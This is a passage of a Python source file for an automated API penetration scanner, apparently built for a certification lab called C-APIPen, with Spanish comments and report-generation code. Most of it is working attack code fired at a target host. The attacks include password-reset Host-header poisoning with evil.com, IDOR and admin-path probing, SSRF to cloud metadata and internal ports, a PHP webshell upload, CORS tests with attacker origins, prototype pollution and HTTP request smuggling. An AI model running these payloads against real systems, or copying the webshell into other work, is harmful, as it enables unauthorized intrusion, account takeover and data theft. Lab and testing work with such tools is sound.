                self._record_attack(endpoint, "BRUTE", body, result)
    
    def _attack_auth_password_reset(self, endpoint: str, full_url: str) -> None:
        """Prueba Host Header Injection en password reset"""
        if not any(x in endpoint.lower() for x in ["reset", "forgot", "recover", "change-password"]):
            return
        
        # Probar Host Header Injection con diferentes valores
        host_headers = ["evil.com", "127.0.0.1:9999", "localhost"]
        for host in host_headers:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            body = {"email": "admin@target.com"}
            result = self.curl(full_url, method="POST",
                               headers={"Content-Type": "application/json", "Host": host},
                               data=json.dumps(body), timeout=10)
            if result:
                self._record_attack(endpoint, "PWRESET", {"host_poison": host, **body}, result)
    
    def _attack_authorization(self, endpoint: str, full_url: str) -> None:
        """IDOR sequential + BFLA admin paths + Tenant breakout"""
        
        # 1. IDOR: detectar IDs numéricos en el path y probar variantes
        id_match = re.search(r'/(\d+)$', endpoint)
        if id_match:
            base_id = int(id_match.group(1))
            for delta in [1, -1, 10, 100]:
                with self.lock:
                    if self.requests_executed >= 295:
                        return
                new_id = max(0, base_id + delta)
                idor_url = full_url.replace(f"/{base_id}", f"/{new_id}")
                result = self.curl(idor_url, method="GET", timeout=10)
                if result:
                    self._record_attack(endpoint, "IDOR", {"original_id": base_id, "tested_id": new_id}, result)
        
        # 2. BFLA: probar subpaths administrativos
        bfla_paths = ["/admin", "/internal", "/management", "/debug", "/config", "/secrets"]
        for subpath in bfla_paths:
            with self.lock:
                if self.requests_executed >= 295:
                    return
            bfla_url = f"{full_url}{subpath}"
            result = self.curl(bfla_url, method="GET", timeout=10)
            if result:
                self._record_attack(endpoint, "BFLA", {"path": subpath}, result)
        
        # 3. Tenant breakout headers
        tenant_headers_sets = [
            {"X-Organization-ID": "1", "X-Tenant-ID": "1"},
            {"X-Organization-ID": "999", "X-Tenant-ID": "999"},
        ]
        for tenant_hdrs in tenant_headers_sets:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            result = self.curl(full_url, method="GET", headers=tenant_hdrs, timeout=10)
            if result:
                self._record_attack(endpoint, "TENANT", tenant_hdrs, result)
    
    def _attack_business_logic(self, endpoint: str, full_url: str) -> None:
        """Prueba valores negativos, cero, nulos en campos numéricos"""
        biz_payloads = [
            {"amount": -1, "quantity": -1, "price": -1},
            {"amount": 0, "quantity": 0},
            {"amount": None, "quantity": None},
            {"amount": 99999999},
            {"discount": 100, "percentage": 100},
        ]
        for bpayload in biz_payloads:
            with self.lock:
                if self.requests_executed >= 295:
                    return
            result = self.curl(full_url, method="POST",
                               headers={"Content-Type": "application/json"},
                               data=json.dumps(bpayload), timeout=10)
            if result:
                self._record_attack(endpoint, "BIZLOGIC", bpayload, result)
    
    def _attack_ssrf_portscan(self, endpoint: str, full_url: str) -> None:
        """SSRF port scan: probar URLs de servicios internos en parámetros comunes"""
        # Parámetros que suelen aceptar URLs
        url_params = ["url", "path", "file", "redirect", "callback", "webhook", "image", "src", "href", "target"]
        
        internal_urls = [
            "http://127.0.0.1:80", "http://127.0.0.1:443",
            "http://127.0.0.1:8080", "http://127.0.0.1:8443",
            "http://127.0.0.1:3306", "http://127.0.0.1:27017",
            "http://127.0.0.1:6379", "http://127.0.0.1:5432",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1:22",
        ]
        
        for param in url_params[:5]:  # Limitar a 5 parámetros para no exceder budget
            for internal_url in internal_urls[:6]:  # Limitar a 6 URLs
                with self.lock:
                    if self.requests_executed >= 285:
                        return
                query_url = f"{full_url}?{param}={internal_url}"
                result = self.curl(query_url, method="GET", timeout=10)
                if result:
                    self._record_attack(endpoint, "SSRF", {"param": param, "url": internal_url}, result)
    
    def _attack_file_upload(self, endpoint: str, full_url: str) -> None:
        """Prueba endpoints de file upload con multipart/form-data"""
        if not any(x in endpoint.lower() for x in ["upload", "file", "image", "avatar", "media", "document", "attach"]):
            return
        
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="test.php"\r\n'
            f"Content-Type: application/x-php\r\n\r\n"
            f"<?php system($_GET['cmd']); ?>\r\n"
            f"--{boundary}--\r\n"
        )
        result = self.curl(full_url, method="POST",
                           headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                           data=body, timeout=10)
        if result:
            self._record_attack(endpoint, "UPLOAD", {"filename": "test.php", "type": "webshell"}, result)
    
    def _attack_cors(self, endpoint: str, full_url: str) -> None:
        """Prueba CORS Origin reflection"""
        evil_origins = ["https://evil.com", "null", "https://attacker.com"]
        for origin in evil_origins:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            result = self.curl(full_url, method="GET",
                               headers={"Origin": origin, "Referer": f"{origin}/"}, timeout=10)
            if result:
                self._record_attack(endpoint, "CORS", {"origin": origin}, result)
    
    def _attack_verbose_errors(self, endpoint: str, full_url: str) -> None:
        """Provoca errores verbose con payloads malformados"""
        error_payloads = [
            ("malformed_json", "{malformed"),
            ("type_confusion_string", json.dumps({"id": "not_an_integer_when_expecting_int"})),
            ("type_confusion_array", json.dumps({"id": [1, 2, 3]})),
            ("extra_fields", json.dumps({"__proto__": {"admin": True}, "constructor": {"prototype": {"admin": True}}})),
            ("null_values", json.dumps({"id": None, "name": None})),
        ]
        for test_name, payload_data in error_payloads:
            with self.lock:
                if self.requests_executed >= 290:
                    return
            content_type = "application/xml" if "xxe" in test_name else "application/json"
            result = self.curl(full_url, method="POST",
                               headers={"Content-Type": content_type},
                               data=payload_data, timeout=10)
            if result:
                self._record_attack(endpoint, "ERROR", {"test": test_name}, result)
    
    def _attack_soap_wsdl(self, endpoint: str) -> None:
        """Descubre y prueba endpoints SOAP/WSDL"""
        wsdl_paths = ["?wsdl", "?WSDL", "/wsdl", "/service.svc", "/service.asmx"]
        for wspath in wsdl_paths:
            with self.lock:
                if self.requests_executed >= 295:
                    return
            wsdl_url = f"{self.host}{endpoint}{wspath}" if endpoint != "/" else f"{self.host}{wspath}"
            result = self.curl(wsdl_url, method="GET", timeout=10)
            if result and result.status_code == 200:
                self.state.findings.append(f"WSDL/SOAP posible: {wsdl_url}")
                self.state.discovered_docs.append(wsdl_url)
                self._record_attack(endpoint, "WSDL", {"path": wspath}, result)
    
    def _attack_smuggling(self, endpoint: str) -> None:
        """HTTP Request Smuggling: CL.TE y TE.CL"""
        smuggle_tests = [
            # CL.TE: Content-Length + Transfer-Encoding
            {
                "name": "CL.TE",
                "headers": {"Content-Length": "13", "Transfer-Encoding": "chunked"},
                "data": "0\r\n\r\nG"
            },
            # TE.CL: Transfer-Encoding + Content-Length
            {
                "name": "TE.CL",
                "headers": {"Transfer-Encoding": "chunked", "Content-Length": "4"},
                "data": "5c\r\nGPOST /404 HTTP/1.1\r\nContent-Length: 15\r\n\r\n0\r\n\r\n"
            },
            # CL hidden: doble Content-Length
            {
                "name": "CL-CL",
                "headers": {"Content-Length": "5", "Content-Length": "0"},
                "data": "x=1"
            },
        ]
        full_url = f"{self.host}{endpoint}" if endpoint != "/" else self.host
        for test in smuggle_tests:
            with self.lock:
                if self.requests_executed >= 298:
                    return
            result = self.curl(full_url, method="POST",
                               headers=test["headers"], data=test["data"], timeout=15)
            if result:
                # Smuggling exitoso si respuesta es inesperada (timeout, 404 en lugar de 200, etc.)
                if result.status_code in [404, 405, 500] or result.returncode != 0:
                    self.state.findings.append(f"Posible HTTP Smuggling ({test['name']}): {full_url}")
                self._record_attack(endpoint, f"SMUGGLE-{test['name']}", test, result)

    def _record_attack(self, endpoint: str, method: str, payload: Dict, result: ToolResult) -> None:
        """Registra un ataque en la matriz"""
        body = self.extract_http_body(result.stdout)
        preview = body[:200] if body else ""
        
        # Agregar a matrix
        self.attack_matrix.add_attack(
            endpoint,
            method,
            payload,
            result.status_code,
            result.duration_ms,
            result.flags,
            preview
        )
        
        if result.flags:
            print(f"    [!!!] FLAG encontrada: {result.flags}")

    def generate_report_md(self) -> Path:
        report_path = self.scan_folder / "report.md"
        
        lines = []
        lines.append(f"# Scan Report - {self.host}")
        lines.append("")
        
        # Metadata
        end_time = dt.datetime.now(dt.timezone.utc)
        duration = (end_time - self.start_time).total_seconds()
        lines.append(f"- **Started:** {self.state.started_at}")
        lines.append(f"- **Duration:** {duration:.1f} seconds")
        lines.append(f"- **Host:** {self.host}")
        lines.append(f"- **Mode:** {'Swagger' if self.state.swagger_mode else 'Discovery'}")
        lines.append(f"- **Flags Found:** {len(self.state.flags)}")
        lines.append(f"- **Commands Executed:** {len(self.state.tool_results)}")
        lines.append(f"- **Requests:** {self.requests_executed} / 300")
        lines.append("")
        
        # Redirects
        if self.redirect_tracker.redirects:
            lines.append("## 🔀 Redirects Descubiertos")
            for redirect in self.redirect_tracker.redirects:
                chain_str = " → ".join([r['url'] for r in redirect['chain']])
                lines.append(f"- `{chain_str}`")
            lines.append("")
        
        # Docs
        if self.state.discovered_docs:
            lines.append("## 📚 Documentación Encontrada")
            for doc in self.state.discovered_docs:
                lines.append(f"- ✓ {doc}")
            lines.append("")
        
        # Flags
        if self.state.flags:
            lines.append("## 🚩 Flags Encontradas")
            for flag in self.state.flags:
                lines.append(f"- `{flag}`")
            lines.append("")
        
        # Endpoints válidos (donde se ejecutaron payloads)
        if self.state.valid_endpoints:
            if self.state.swagger_mode:
                lines.append("## 🎯 Endpoints Válidos (Atacados)")
            else:
                lines.append("## 🎯 Endpoints Válidos (Atacados)")
            
            for ep in sorted(self.state.valid_endpoints):
                display_ep = ep if ep else "/"
                if self.state.swagger_mode and ep in self.state.swagger_endpoints:
                    methods = list(self.state.swagger_endpoints[ep].methods.keys())
                    lines.append(f"- `{display_ep}` ({', '.join(methods)})")
                else:
                    lines.append(f"- `{display_ep}`")
            lines.append("")
        
        # Endpoints descubiertos pero no atacados (SOLO en modo discovery)
        if not self.state.swagger_mode:
            not_attacked = self.state.discovered_endpoints - self.state.valid_endpoints
            if not_attacked:
                lines.append("## ⚠️ Endpoints Descubiertos (No Válidos)")
                for ep in sorted(not_attacked):
                    lines.append(f"- `{ep}` (404 u otro error)")
                lines.append("")
        
        # Findings
        if self.state.findings:
            lines.append("## 📋 Findings")
            for finding in self.state.findings:
                lines.append(f"- {finding}")
            lines.append("")
        
        # Technologies detected
        if self.state.technologies:
            lines.append("## 🛠️ Tecnologías Detectadas")
            for tech in self.state.technologies:
                lines.append(f"- {tech}")
            lines.append("")
        
        # Response analysis findings
        if self.state.analysis_findings:
            lines.append("## 🔬 Análisis de Respuestas")
            for af in self.state.analysis_findings[:20]:
                lines.append(f"- `{af}`")
            lines.append("")
        
        # GraphQL schema
        if self.state.graphql_schema:
            lines.append("## 🕸️ GraphQL Schema")
            types = self.state.graphql_schema.get("__schema", {}).get("types", [])
            names = [t["name"] for t in types if t.get("name") and not t["name"].startswith("__")]
            lines.append(f"- **Tipos descubiertos:** {len(names)}")
            if names:
                lines.append(f"- **Tipos:** {', '.join(names[:30])}")
            lines.append("")
        
        # Files generated
        lines.append("## 📁 Archivos Generados")
        lines.append(f"- `report.md` (este archivo)")
        lines.append(f"- `commands.log` ({len(self.state.tool_results)} comandos)")
        lines.append(f"- `redirects.json` ({len(self.redirect_tracker.redirects)} redirects)")
        lines.append(f"- `discovered-docs.json` ({len(self.doc_logger.docs)} rutas testeadas)")
        lines.append(f"- `attacks-matrix.csv` ({self.requests_executed} ataques)")
        lines.append(f"- `responses/` ({self.response_cacher.response_count} archivos)")
        lines.append(f"- `latest-scan.json` (metadata consolidada)")
        lines.append("")
        
        report_path.write_text("\n".join(lines), encoding="utf-8")
        return report_path

    def finalize_outputs(self) -> None:
        # Guardar redirects
        self.redirect_tracker.save_redirects(self.scan_folder / "redirects.json")
        
        # Guardar docs
        self.doc_logger.save_docs(self.scan_folder / "discovered-docs.json")
        
        # Generar latest-scan.json consolidado
        end_time = dt.datetime.now(dt.timezone.utc)
        duration = (end_time - self.start_time).total_seconds()
        
        # Preparar endpoints con metadata - SOLO los VÁLIDOS
        endpoints_valid_data = {}
        for ep in sorted(self.state.valid_endpoints):
            if self.state.swagger_mode and ep in self.state.swagger_endpoints:
                swagger_ep = self.state.swagger_endpoints[ep]
                methods = list(swagger_ep.methods.keys())
                param_names = [p.name for p in swagger_ep.global_parameters]
                
                for method in swagger_ep.methods.values():
                    param_names.extend([p.name for p in method.parameters])
                
                endpoints_valid_data[ep] = {
                    "methods": methods,
                    "parameters": list(set(param_names)),
                    "security": swagger_ep.security,
                    "description": swagger_ep.description
                }
            else:
                # Modo discovery o endpoint sin swagger data
                endpoints_valid_data[ep] = {
                    "methods": ["GET", "POST", "PUT", "DELETE"]
                }
        
        # En swagger_mode, endpoints_invalid siempre vacío
        endpoints_invalid = [] if self.state.swagger_mode else sorted(list(self.state.discovered_endpoints - self.state.valid_endpoints))
        
        consolidado = {
            "metadata": {
                "host": self.state.host,
                "mode": "swagger" if self.state.swagger_mode else "discovery",
                "swagger_url": self.swagger_url if self.state.swagger_mode else None,
                "started_at": self.state.started_at,
                "ended_at": end_time.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "duration_seconds": duration,
                "total_commands_executed": len(self.state.tool_results),
                "total_requests": self.requests_executed,
                "max_requests_limit": 300,
                "technologies": self.state.technologies,
                "server_fingerprint": self.state.server_fingerprint,
            },
            "discovery": {
                "total_endpoints_discovered": len(self.state.discovered_endpoints),
                "total_endpoints_valid": len(self.state.valid_endpoints),
                "endpoints_valid": endpoints_valid_data,
                "endpoints_invalid": endpoints_invalid
            },
            "flags_found": self.state.flags,
            "docs_found": self.state.discovered_docs,
            "analysis_findings": self.state.analysis_findings[:30],
            "graphql_schema_found": self.state.graphql_schema is not None,
            "redirects_count": len(self.redirect_tracker.redirects),
            "attacks_executed": self.requests_executed,
            "response_files_saved": self.response_cacher.response_count,
            "files_generated": [
                "report.md",
                "commands.log",
                "redirects.json",
                "discovered-docs.json",
                "attacks-matrix.csv",
                "responses/",
                "latest-scan.json"
            ]
        }
        
        (self.scan_folder / "latest-scan.json").write_text(
            json.dumps(consolidado, indent=2),
            encoding="utf-8"
        )


def main() -> int:
    parser = argparse.ArgumentParser(description="Automatiza discovery, fuzzing y reporte para C-APIPen con logging exhaustivo")
    parser.add_argument("--host", required=True, help="Host o URL base del examen")
    parser.add_argument("--credentials", help="Credenciales opcionales en base64 o JWT")
    parser.add_argument("--swagger-url", help="URL directa al swagger/openapi (ej: https://host/swagger-ui/dist/swagger.yaml)")
    parser.add_argument("--output-dir", default=".", help="Directorio de salida")
    parser.add_argument("--proxy", help="Proxy HTTP (ej: http://127.0.0.1:8080)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Modo verbose (debug output)")
    parser.add_argument("--concurrency", type=int, default=5, help="Número de workers concurrentes (default: 5)")
    args = parser.parse_args()

    scanner = CapipenScanner(
        host=args.host,
        credentials=args.credentials,
        output_dir=Path(args.output_dir),
        swagger_url=args.swagger_url,
        proxy=args.proxy,
        verbose=args.verbose,
        concurrency=args.concurrency,
    )
    report = scanner.run()
    print(f"\n[✓] Reporte principal: {report}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
